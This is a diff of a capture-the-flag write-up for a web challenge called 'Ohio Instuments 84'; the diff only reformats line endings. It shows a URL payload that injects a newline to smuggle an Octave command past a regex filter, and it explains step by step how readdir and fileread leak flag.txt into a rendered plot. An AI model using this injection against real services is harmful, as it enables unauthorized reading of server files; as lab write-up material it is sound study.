@@ -1,7 +1,7 @@
 ### Challenge
-Name: Ohio Instuments 84
-Category: web
-Difficulty: medium
+Name: Ohio Instuments 84  
+Category: web  
+Difficulty: medium  
 
 ### Solution
 Enter the URL `https://ohio-instruments-84.chall.pwnoh.io/x)%0Atitle(fileread(char(readdir(char(46))(8)))`
@@ -18,7 +18,7 @@ const filename = `${crypto.randomUUID()}.jpg`;
 const cmd = `x = -10:.2:10; h = figure('visible', 'off'); plot(x, ${expr}); saveas(h, '${filename}')`;
 ```
 #### Regex breakdown
-`x, (, ), +, *, -, ., ^, \d (digits), \s (whitespace)` are all valid characters
+`x, (, ), +, *, -, ., ^, \d (digits), \s (whitespace)` are all valid characters  
 You can also use any `\w (alphanumeric or underscore)` character followed by a `(`
 [regexr](https://regexr.com/) is a great tool for writing regex validated payloads
 
@@ -36,11 +36,11 @@ After substitution
 x = -10:.2:10; h = figure('visible', 'off'); plot(x, x)
 title(fileread(char(readdir(char(46))(8)))); saveas(h, 'xxxxxxxxxxxxxxxx.png')
 ```
-So we plot a line, and run `title(fileread(char(readdir(char(46))(8))))`
-`char(46)` returns the character with ASCII code 46 (`"."`)
-`readdir(".")` returns a cell array of strings with filenames in the current directory
-`readdir(".")(8)` gets the 8th item from that cell array (`"flag.txt"`)
-`char("flag.txt")` casts a cell type to a string
-`fileread("flag.txt")` reads the content of the flag `"bctf{the_flag_contents}"`
-`title("bctf{the_flag_contents}")` writes the flag to the plot
-Then it is sent to use with the flag!
+So we plot a line, and run `title(fileread(char(readdir(char(46))(8))))`  
+`char(46)` returns the character with ASCII code 46 (`"."`)  
+`readdir(".")` returns a cell array of strings with filenames in the current directory  
+`readdir(".")(8)` gets the 8th item from that cell array (`"flag.txt"`)  
+`char("flag.txt")` casts a cell type to a string  
+`fileread("flag.txt")` reads the content of the flag `"bctf{the_flag_contents}"`  
+`title("bctf{the_flag_contents}")` writes the flag to the plot  
+Then it is sent to use with the flag!  
